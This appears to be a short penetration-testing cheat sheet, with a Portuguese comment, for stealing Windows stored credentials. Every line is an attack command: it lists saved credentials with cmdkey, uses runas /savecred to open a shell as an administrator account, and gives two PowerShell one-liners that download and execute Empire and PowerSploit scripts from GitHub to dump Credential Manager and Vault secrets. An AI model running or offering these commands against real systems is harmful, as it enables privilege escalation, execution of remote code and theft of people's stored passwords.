cmdkey /list
runas /savecred /user:administrador cmd.exe

Extrai as credenciais do Credential Manager
iex (New-Object System.Net.WebClient).DownloadString
("https://github.com/EmpireProject/Empire/raw/master/data/module_source/credentials/dumpCredStore.ps1");Enum-Creds
iex (New-Object System.Net.WebClient).DownloadString
("https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Get-VaultCredential.ps1");Get-VaultCredential
